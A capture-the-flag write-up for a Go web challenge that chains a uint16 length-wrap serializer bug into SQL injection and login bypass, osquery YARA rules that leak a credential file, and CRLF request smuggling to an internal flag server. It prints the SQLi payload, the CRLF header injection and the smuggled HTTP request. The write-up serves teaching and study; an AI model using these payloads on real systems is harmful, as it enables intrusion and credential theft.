---
title: "Tired of Running"
description: "CTF web challenge"
summary: "A Go web challenge: a uint16 length-wrap in a custom serializer desynchronizes backend parsing, leading to login bypass, osquery table abuse, inline YARA credential leakage, and a final internal request-splitting trick to recover the flag."
date: 2026-08-09T00:00:00+02:00
lastmod: 2026-08-09T00:00:00+02:00
tags:
  - CTF
  - walkthrough
  - web
  - Go
  - SQLi
  - osquery
  - YARA
  - request-smuggling
categories:
  - writeup
cover: "covers/Tired-of-Running.png"
draft: false
---
## Challenge Summary

This challenge is a Go web application backed by `osquery`. The frontend exposes:

- `/login`
- `/filesMetadata`

There is also an internal flag service on port `5001` and an internal verification service on port `5002`.

The full exploit chain is:

1. Abuse a length-wrap bug in the app's custom serializer.
2. Use the resulting desynchronization to control backend query fields.
3. Bypass login.
4. Pivot `/filesMetadata` from the intended `file` table into the hidden `yara` table.
5. Leak `/opt/vault/credentials.dat`.
6. Abuse header injection in the `curl` osquery table to smuggle a second HTTP request.
7. Submit the leaked credential to the internal flagserver.

## Step 1: The Real Bug Is the Custom Serialization Format

lets take a look in that function 

```go
func serializeBuffer(f1, f2, f3 []byte) []byte {
    var buf bytes.Buffer

    packField := func(data []byte) {
        length := uint16(len(data))
        binary.Write(&buf, binary.BigEndian, length)
        buf.Write(data)
    }

    packField(f1)
    packField(f2)
    packField(f3)

    return buf.Bytes()
}
```
as you can see he is using `uint16` that means the maximum length is `65535` if a field is longer than that, the stored length wraps and the rest remans in buffer

look closer to this function 
```go
func deserializeBuffer(buf []byte) (f1, f2, f3 []byte, err error) {
    reader := bytes.NewReader(buf)

    unpackField := func() ([]byte, error) {
        var length uint16
        if err := binary.Read(reader, binary.BigEndian, &length); err != nil {
            return nil, err
        }
        data := make([]byte, length)
        if _, err := io.ReadFull(reader, data); err != nil {
            return nil, err
        }
        return data, nil
    }

    if f1, err = unpackField(); err != nil {
        return
    }
    if f2, err = unpackField(); err != nil {
        return
    }
    if f3, err = unpackField(); err != nil {
        return
    }
    return f1, f2, f3, nil
}
```
If we make `f1` very large, we can force:

- the stored length of `f1` to wrap to a small value
- the leftover bytes of `f1` to be interpreted as:
  - the length of `f2`
  - the content of `f2`
  - the length of `f3`
  - the content of `f3`

So we do not just control a normal input value anymore. We effectively control how the backend reconstructs all three logical fields.
## Step 2: Why This Becomes SQL Injection
Inside `queryHandler()`, the backend turns those parsed fields into an SQL string:

```go
if string(table) == "users" {
    query = fmt.Sprintf(
        "SELECT * FROM %s WHERE %s='%s' and directory like '/home/%%';",
        table,
        parameter,
        valueStr,
    )
} else {
    query = fmt.Sprintf(
        "SELECT * FROM %s WHERE %s='%s';",
        table,
        parameter,
        valueStr,
    )
}
```

There is a weak filter:

```go
if strings.Contains(valueStr, "'") {
    http.Error(w, "no SQLi", http.StatusBadRequest)
    return
}
```

But it only filters `'` in `valueStr`.

It does **not** protect:

- `parameter`
- `table`

Those two values are inserted directly into the SQL query string.

That means if we can use the desync to replace:

- `parameter = username`

with:

- `parameter = username LIKE '%' OR 1-- `

then the final query becomes:

```sql
SELECT * FROM users WHERE username LIKE '%' OR 1-- ='x' and directory like '/home/%';
```
## Step 3: Login Bypass

The normal login flow is:

- field 1 = user-supplied handle
- field 2 = `username`
- field 3 = `users`

Using the serializer bug, we instead make the backend parse:

- field 1 = `x`
- field 2 = `username LIKE '%' OR 1-- `
- field 3 = `users`

That is enough to make the `users` query return at least one row.

The application considers login successful if the backend response body is exactly `OK`:

```go
if len(results) > 0 {
    fmt.Fprintf(w, "OK")
}
```

And the frontend grants a session if the body length is `2`.
## Step 4: Pivoting `/filesMetadata`

The `/filesMetadata` route normally does this:

```go
filename := r.Form.Get("q")
serialized := serializeBuffer([]byte(filename), []byte("path"), []byte("file"))
```

because the same `serializeBuffer()` bug is reused here, we can again desynchronize the fields and choose our own:

- `parameter`
- `table`

The allowed osquery tables are:

```go
var allowedTables = []string{
    "users",
    "file",
    "curl",
    "yara",
    "interface_addresses",
    "etc_hosts",
}
```

The interesting tables are:

- `yara`
- `curl`


## Step 5: Hidden YARA Constraints Save the Exploit

The breakthrough is that the `yara` virtual table has hidden columns. `pragma table_xinfo(yara)` shows:

- `sigrule`
- `sigurl`
- `pid_with_namespace`

That means we do not need a file on disk. We can inject a YARA rule directly using `sigrule`.

The target file is:

```text
/opt/vault/credentials.dat
```

This file is loaded by the verification service in:

```go
const credentialPath = "/opt/vault/credentials.dat"
```
## Step 6: Leaking the Credential with Inline YARA

The `yara` table output includes the names of matching rules in the `matches` field.

That means we can encode the leaked value into rule names.

Example idea:

- `rule p00_2 { strings: $a = /^2/ condition: $a }`
- `rule p01_4 { strings: $a = /^.4/ condition: $a }`
- `rule p02_c { strings: $a = /^..c/ condition: $a }`

If the file starts with `24c...`, those rule names appear in the result.

So the strategy is:

1. split the 64-character hex credential into chunks
2. for each chunk, generate 16 candidate rules per position
3. inject those rules via `sigrule`
4. read the matching rule names from `matches`
5. reconstruct the full secret

you can see how in solver.py at the end 

Recovered remote credential:

```text
24c5a308732ba9e6c2075e7337aef60f070c411cfb06137c21991f4e637d8605
```

## Step 7: Understanding the Flag Server

The internal flag server works like this:

1. it accepts a POST body
2. it forwards that body to the verifier at `http://app:5002/verify`
3. if accepted, it computes:

```go
sum := sha256.Sum256(submitted)
path := "/" + hex.EncodeToString(sum[:])
```

4. it unlocks that path for two minutes
5. a subsequent GET to that exact path returns the flag once


So after leaking the credential, we need to:

1. send it as the body of a POST to the internal flagserver
2. compute `sha256(credential)`
3. GET `/<sha256(credential)>`

## Step 8: The Winning Trick Is Request Splitting via `user_agent`

first you need to know how curl table works in the osquary GET request but we need body to access the flag that is the method

The `user_agent` field is inserted directly into the outgoing HTTP request, and literal CRLFs are preserved.

That means a payload like:

```sql
'test' || char(13) || char(10) || 'X-Test: yes'
```

actually becomes:

```http
User-Agent: test
X-Test: yes
```

So we turn one `curl` table GET into:

```http
GET / HTTP/1.1
User-Agent: ua
Host: flagserver:5001

POST / HTTP/1.1
Host: flagserver:5001
Content-Length: 64

24c5a308732ba9e6c2075e7337aef60f070c411cfb06137c21991f4e637d8605
```

The first request is harmless and gets a normal response.
The second request is the real exploit: it submits the credential to the flagserver.



## Step 9: Final Remote Request

Once the credential is known, the exploit computes:

```text
sha256(24c5a308732ba9e6c2075e7337aef60f070c411cfb06137c21991f4e637d8605)
= 047d15db72b47a7e8b874b279789f9fb2c76703be748b3593f399c9b06cf8564
```

Then:

1. send the split request through the `curl` table to unlock the flag
2. fetch:

```text
http://flagserver:5001/047d15db72b47a7e8b874b279789f9fb2c76703be748b3593f399c9b06cf8564
```


```text
africc{wh4t_4_gr34t_marathon}
```
